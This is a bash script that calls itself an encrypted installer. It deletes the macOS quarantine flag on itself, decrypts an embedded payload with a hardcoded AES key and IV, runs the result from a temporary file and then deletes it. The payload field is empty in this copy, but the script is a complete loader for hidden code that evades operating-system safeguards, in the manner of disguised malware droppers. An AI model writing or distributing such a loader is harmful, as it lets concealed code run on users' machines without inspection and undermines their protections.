#!/usr/bin/env bash
[ -n "${BASH_VERSION:-}" ] || exec /bin/bash "$0" "$@"
xattr -d com.apple.quarantine "$0" 2>/dev/null || true
# Encrypted installer - V4.42
D=""
K="41d5c833414c5133cd0f88f7cc2550a8ccb654dc2030e367d1f32af8c7fff012"
V="dc68fd3364c62612081a5b805cb0f4c1"
TMP_SCRIPT=$(mktemp /tmp/installer_XXXXXX)
echo "$D" | openssl enc -aes-256-cbc -d -a -A -K "$K" -iv "$V" > "$TMP_SCRIPT"
chmod +x "$TMP_SCRIPT"
/bin/bash "$TMP_SCRIPT"
EXIT_CODE=$?
rm -f "$TMP_SCRIPT"
exit $EXIT_CODE
